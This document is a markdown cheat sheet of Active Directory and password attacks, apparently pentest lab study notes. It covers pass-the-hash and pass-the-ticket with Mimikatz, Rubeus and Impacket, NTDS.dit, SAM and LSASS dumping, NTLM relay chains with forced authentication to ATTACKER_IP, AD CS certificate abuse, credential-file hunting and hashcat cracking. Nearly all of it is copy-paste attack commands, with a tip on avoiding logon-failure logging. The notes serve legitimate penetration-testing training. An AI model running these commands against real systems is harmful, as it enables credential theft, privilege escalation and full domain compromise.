# ADDENDUM 05: AD Attacks, Password Attacks & Credential Hunting

## Pass-the-Hash (PtH) Complete

### Windows — Mimikatz
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:"cmd.exe"
```

### evil-WinRM PtH
```bash
evil-winrm -i 10.129.x.x -u Administrator -H <NTLM_HASH>
```

### xfreerdp PtH (Restricted Admin Mode)
```bash
xfreerdp /v:TARGET /u:Administrator /pth:<HASH>
# Enable Restricted Admin Mode if needed:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

### CrackMapExec PtH
```bash
crackmapexec smb 10.129.x.x -u Administrator -H <HASH> --local-auth
```

### Impacket PtH
```bash
impacket-psexec -hashes :<HASH> Administrator@IP
impacket-wmiexec -hashes :<HASH> Administrator@IP
impacket-smbexec -hashes :<HASH> Administrator@IP
```

### Invoke-TheHash
```powershell
Invoke-SMBExec -Target IP -Username Admin -Hash <HASH> -Command "whoami"
```

### UAC Bypass — LocalAccountTokenFilterPolicy
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
# Value 0 (default): Local accounts get filtered token — PtH FAILS
# Value 1: Full token — PtH WORKS
```

### DCC2 Warning
DCC2 hashes (hashcat mode 2100) **CANNOT be used for PtH** — must crack first.

## Pass-the-Ticket (PtT) — Windows & Linux

### Windows — Ticket Harvesting (Mimikatz)
```cmd
mimikatz # sekurlsa::tickets /export    # Export all tickets
mimikatz # kerberos::ptt ticket.kirbi   # Inject ticket
```

### Windows — Rubeus
```cmd
Rubeus.exe triage                      # List tickets
Rubeus.exe dump                        # Dump all tickets
Rubeus.exe ptt /ticket:ticket.kirbi   # Inject ticket
```

### OverPass-the-Hash (Windows)
Convert NTLM/AES hash to TGT without password:
```cmd
mimikatz # sekurlsa::logonpasswords     # Get NTLM or AES hash
mimikatz # sekurlsa::pth /user:admin /domain:DOM /ntlm:<HASH> /run:"klist"
# Or with AES keys:
mimikatz # sekurlsa::ekeys              # Get AES keys
```

### Linux — ccache File Abuse
```bash
find / -name "*.ccache" -o -name "krb5cc_*" 2>/dev/null
echo $KRB5CCNAME
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass domain/user@target
impacket-smbexec -k -no-pass domain/user@target
```

### Linux — KeyTab Extraction
```bash
find / -name "*.keytab" 2>/dev/null
klist -k -t -K -e /path/to/keytab
kinit -kt /path/to/keytab principal@DOMAIN
```

### Cross-Platform Ticket Conversion
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache   # Windows → Linux
impacket-ticketConverter ticket.ccache ticket.kirbi   # Linux → Windows
```

### Kerberoasting
```bash
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
```bash
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## SAM/SYSTEM/SECURITY Hive Extraction
```cmd
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
reg save HKLM\SECURITY C:\Users\Public\SECURITY

# Extract hashes
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Crack DCC2
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt
```

## NTDS.dit Extraction
```bash
# VSS shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
reg save HKLM\SYSTEM C:\SYSTEM

# ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\extract" q q

# secretsdump (preferred — no file transfer needed)
impacket-secretsdump -just-dc -just-dc-user Admin DOMAIN/USER:PASS@DC_IP
impacket-secretsdump -just-dc -ntds ntds.dit -system SYSTEM LOCAL
```

## NTLM Relay Attack Chains

### Responder Configuration
```bash
# Edit /etc/Responder/Responder.conf → SMB=Off, HTTP=Off
responder -I tun0
```

### impacket-ntlmrelayx
```bash
# Basic relay
impacket-ntlmrelayx -tf targets.txt -smb2support

# With command execution
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Relay to LDAP (AD CS ESC8)
impacket-ntlmrelayx -t ldaps://DC_IP --no-wcf-server --escalate-user "relay_user"

# Relay to ADCS web enrollment
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
```

### MSSQL xp_dirtree Forced Auth
```sql
EXEC master..xp_dirtree '\\ATTACKER_IP\share'
-- Forces SQL service account to authenticate to your SMB server
```

### Full Attack Chain
1. `impacket-ntlmrelayx -t ldaps://DC --escalate-user relay_user`
2. Coerce auth via PetitPotam, PrinterBug, or xp_dirtree
3. ntlmrelayx relays to LDAP and escalates relay_user
4. Attacker now has escalated privileges

## AD CS Attacks

### ESC8 — NTLM Relay to ADCS Web Enrollment
```bash
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
# Coerce auth → get certificate → authenticate with cert
```

### Shadow Credentials
Write to `msDS-KeyCredentialLink` → authenticate via PKINIT:
```bash
python3 PKINITtools/gettgtpkinit.py -cert-pfx shadow.pfx -pfx-pass PASS DOMAIN/target out.ccache
export KRB5CCNAME=out.ccache
impacket-psexec -k -no-pass domain/target@target
```

### PassTheCert
```bash
certipy auth -pfx certificate.pfx -dc-ip DC_IP -domain DOMAIN
# Windows:
Rubeus.exe asktgt /user:target /certificate:cert.pfx /password:cert_password
```

### Certipy
```bash
certipy find -u user@domain -p pass -dc-ip DC_IP
certipy req -ca "CA_NAME" -template "User" -u user@domain -p pass
certipy auth -pfx user.pfx -dc-ip DC_IP
```

## Linux Credential Hunting

| Tool | Command | Description |
|------|---------|-------------|
| **Mimipenguin** | `sudo ./mimipenguin.sh` | Dump passwords from memory (Mimikatz for Linux) |
| **LaZagne** | `laazagne all` / `laazagne browsers` / `laazagne ssh` | Extract stored credentials |
| **Linikatz** | `python3 linikatz.py` | Extract credentials from Linux |
| **Firefox Decrypt** | `python3 firefox_decrypt.py /path/to/profile` | Decrypt Firefox saved passwords |

### KeyTab Files
```bash
find / -name "*.keytab" 2>/dev/null
klist -k -t -K -e /path/to/keytab
```

### ccache Files
```bash
find / -name "*.ccache" -o -name "krb5cc_*" 2>/dev/null
echo $KRB5CCNAME
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Common Linux Credential Locations
| File | Contains |
|------|----------|
| `/etc/shadow` | Password hashes |
| `~/.bash_history` | Command history (may contain passwords) |
| `~/.ssh/id_rsa` | SSH private keys |
| `~/.gnupg/` | GPG keys |
| `/etc/krb5.keytab` | Kerberos keytab |
| `~/.mozilla/firefox/` | Browser credentials |
| `~/.aws/credentials` | AWS credentials |
| `~/.kube/config` | Kubernetes credentials |

## Windows Credential Hunting

### Windows Credential Manager
```cmd
cmdkey /list                                      # Show saved credentials
runas /savecred /user:Administrator cmd.exe       # Use saved creds
mimikatz # sekurlsa::credman                     # Dump Credential Manager
```

### DPAPI
- Encrypts: browser passwords, RDP files, WiFi keys
- Requires: user's master key (derived from password) or SYSTEM access
- Tools: DonPAPI, Hekatomb

### LSASS Memory Dump — CLI Methods
```cmd
# rundll32 (no tool required)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Users\Public\lsass.dmp full

# Parse with pypykatz
pypykatz lsa minidump lsass.dmp
```

### Mimikatz Direct
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Network Traffic Credential Capture
```bash
sudo tcpdump -i tun0 -w capture.pcap
# Analyze in Wireshark for cleartext: FTP(21), HTTP Basic(80), Telnet(23), IMAP(143), POP3(110), SNMP(161)
```

### Network Share Credential Pillaging
```cmd
Snaffler.exe -s -d DOMAIN -o snaffler.log
# Searches for: passwords, keys, config files, SSH keys, certificates
```

Manual search targets: `*.config`, `*.xml`, `*.ini`, `*.conf`, `*.yml`, `id_rsa`, `authorized_keys`, `known_hosts`

## Hashcat Comprehensive

### Common Modes
| Hash Type | Mode | Hash Type | Mode |
|-----------|------|-----------|------|
| NTLM | 1000 | Net-NTLMv2 | 5600 |
| Kerberos TGS-REP | 13100 | AS-REP | 18200 |
| DCC2 | 2100 | MD5 | 0 |
| SHA1 | 100 | SHA256 | 1400 |
| SHA512 | 1700 | bcrypt | 3200 |
| WPA2 | 22000 | ZIP | 13600 |
| PDF | 10500 | 7-Zip | 11600 |
| RAR5 | 13000 | SSH keys | 22921 |
| KeePass | 13400 | | |

### Rule-Based Attacks
```bash
hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule
# Custom rules: create .rule files with directives (c, u, l, $1, ^1, @, d, p, T, {, })
```

### Combinator Attacks
```bash
hashcat -m 1000 hash.txt dict1.txt dict2.txt -a 1
```

### Mask Attacks
```bash
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?d?d?d?d
```

### Session Management
```bash
hashcat -m 1000 hash.txt wordlist.txt --session mysession
hashcat --session mysession --restore
```

## John the Ripper

```bash
# Basic
john --format=NT hash.txt

# Wordlist
john --format=NT --wordlist=rockyou.txt hash.txt

# Rules
john --format=NT --wordlist=rockyou.txt --rules=Jumbo hash.txt

# Incremental mode
john --format=NT --incremental=Alpha hash.txt

# Show results
john --show hash.txt

# Convert to JTR format
hashcat2john, keepass2john, zip2john, rar2john, ssh2john
```

## Custom Wordlist Generation
```bash
cupp -i                              # Interactive profile-based
cewl -d 3 -m 5 -w output.txt URL    # Scrape website for words
username-anarchy                     # Generate username combos from names
```

## Protected File Cracking
| File | Tool | Hashcat Mode |
|------|------|-------------|
| ZIP | `zip2john file.zip > hash.txt` | 13600 |
| PDF | `pdf2john file.pdf > hash.txt` | 10500 |
| SSH keys | `ssh2john id_rsa > hash.txt` | 22921 |
| KeePass | `keepass2john file.kdbx > hash.txt` | 13400 |
| 7-Zip | `7z2john file.7z > hash.txt` | 11600 |
| RAR | `rar2john file.rar > hash.txt` | 13000 |

## BloodHound
```cmd
# Windows — SharpHound
SharpHound.exe -c All -d DOMAIN

# Azure AD — AzureHound
AzureHound for Azure AD enumeration

# Cypher queries
MATCH (u:User {admincount:true}) RETURN u
# Shortest path to Domain Admin
```

## LDAP Enumeration
```bash
# Anonymous bind
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"

# windapsearch
windapsearch --dc-ip DC_IP -d domain.local -u user -p pass --users --groups --computers

# PowerView (PowerShell)
Get-DomainUser, Get-DomainComputer, Get-DomainGroup, Get-ObjectAcl
```

## Kerberos Pre-auth Stealth
**Kerbrute doesn't trigger Event ID 4625** (failed logon) because it only tests pre-auth, not actual authentication. Much stealthier than password spraying.
